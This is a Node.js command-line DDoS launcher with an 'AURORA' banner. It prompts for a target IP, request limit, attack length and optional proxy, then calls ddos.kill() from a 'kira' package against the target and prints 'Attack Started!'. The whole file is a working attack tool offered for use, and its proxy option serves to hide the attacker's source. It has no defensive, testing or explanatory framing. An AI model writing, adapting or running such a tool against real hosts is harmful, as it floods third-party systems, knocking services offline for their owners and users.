const Kira = require("kira");
const ddos = new Kira();
const inquirer = require("inquirer");
const { exit } = require("process");
const { clear } = require("console");

clear();

console.log("                                                        ");
console.log(" ▄▄▄       █    ██  ██▀███   ▒█████   ██▀███   ▄▄▄      ");
console.log("▒████▄     ██  ▓██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒▒████▄    ");
console.log("▒██  ▀█▄  ▓██  ▒██░▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  ");
console.log("░██▄▄▄▄██ ▓▓█  ░██░▒██▀▀█▄  ▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██ ");
console.log(" ▓█   ▓██▒▒▒█████▓ ░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒ ▓█   ▓██▒");
console.log(" ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░");
console.log("  ▒   ▒▒ ░░░▒░ ░ ░   ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░");
console.log("  ░   ▒    ░░░ ░ ░   ░░   ░ ░ ░ ░ ▒    ░░   ░   ░   ▒   ");
console.log("      ░  ░   ░        ░         ░ ░     ░           ░  ░");
console.log("                                                        ");

call(async function () {
	let questions = [
		{
			type: "input",
			name: "targetIp",
			message: "Target IP: ",
			validate: function (input) {
				if (!/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.test(input)) {
					return "Please enter a valide IP";
				}
				// [number, number, number, number]
				const arrNumbers = input.split(".").map((val) => parseFloat(val));
				const wrongNumber = arrNumbers.find((val) => !(val >= 0 && val <= 255));
				if (wrongNumber == null) {
					return true;
				}
			},
			filter: function (input) {
				if (!/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.test(input)) {
					return "";
				}
				// [number, number, number, number]
				const arrNumbers = input.split(".").map((val) => parseFloat(val));
				const wrongNumber = arrNumbers.find((val) => !(val >= 0 && val <= 255));
				if (wrongNumber == null) {
					return input;
				}
			},
		},
		{
			type: "input",
			name: "maxLimit",
			message: "Max Limit: ",
			validate: function (value) {
				var valid = !isNaN(parseFloat(value));
				return valid || "Please enter a number";
			},
			filter: function (input) {
				if (!isNaN(parseFloat(input))) {
					return input;
				}
				return "";
			},
		},
		{
			type: "input",
			name: "attackLength",
			message: "Length: ",
			validate: function (value) {
				var valid = !isNaN(parseFloat(value));
				return valid || "Please enter a number";
			},
			filter: function (input) {
				if (!isNaN(parseFloat(input))) {
					return input;
				}
				return "";
			},
		},
		{
			type: "string",
			name: "useProxy",
			message: "Use Proxy? (Y/N) ",
			validate: function (value) {
				var valid = value.toLowerCase() == "y" || value.toLowerCase() == "n";
				return valid || "Please enter Y/N";
			},
			filter: function (input) {
				if (input.toLowerCase() == "y" || input.toLowerCase() == "n") {
					return input;
				}
				return "";
			},
		},
		{
			type: "input",
			name: "proxyIp",
			message: "Proxy IP: ",
			when: function (value) {
				return value.useProxy.toLowerCase() === "y";
			},
			validate: function (input) {
				if (!/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.test(input)) {
					return "Please enter a valide IP";
				}
				// [number, number, number, number]
				const arrNumbers = input.split(".").map((val) => parseFloat(val));
				const wrongNumber = arrNumbers.find((val) => !(val >= 0 && val <= 255));
				if (wrongNumber == null) {
					return true;
				}
				return false;
			},
			filter: function (input) {
				if (!/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.test(input)) {
					return "";
				}
				// [number, number, number, number]
				const arrNumbers = input.split(".").map((val) => parseFloat(val));
				const wrongNumber = arrNumbers.find((val) => !(val >= 0 && val <= 255));
				if (wrongNumber == null) {
					return input;
				}
			},
		},
		{
			type: "input",
			name: "proxyPort",
			message: "Proxy Port: ",
			when: function (value) {
				return value.useProxy.toLowerCase() === "y";
			},
			validate: function (value) {
				var valid = !isNaN(parseFloat(value));
				return valid || "Please enter a number";
			},
			filter: function (input) {
				if (!isNaN(parseFloat(input))) {
					return input;
				}
				return "";
			},
		},
		{
			type: "input",
			name: "start",
			message: "Start? (Y/N) ",
			validate: function (value) {
				var valid = value.toLowerCase() == "y" || value.toLowerCase() == "n";
				return valid || "Please enter Y/N";
			},
			filter: function (input) {
				if (input.toLowerCase() == "y" || input.toLowerCase() == "n") {
					return input;
				}
				return "";
			},
		},
	];

	const answers = await inquirer.prompt(questions);
	const { targetIp } = answers;
	if (!targetIp) {
		return;
	}
	let attackStarted = function () {
		return console.log("Attack Started!");
	};

	if (answers.useProxy.toLowerCase() === "y") {
		if (answers.start.toLowerCase() === "n") {
			setTimeout(exit, 1000);
		} else if (answers.start.toLowerCase() === "y") {
			setTimeout(attackStarted, 5000);
			ddos.kill(`${answers.targetIp}`, answers.maxLimit, answers.attackLength, `${answers.proxyIp}:${answers.proxyPort}`);
		}
	} else if (answers.useProxy.toLowerCase() === "n") {
		if (answers.start.toLowerCase() === "n") {
			setTimeout(exit, 1000);
		}
		if (answers.start.toLowerCase() === "y") {
			setTimeout(attackStarted, 5000);
			ddos.kill(`${answers.targetIp}`, answers.maxLimit, answers.attackLength);
		}
	}
});

function call(fn) {
	return fn();
}
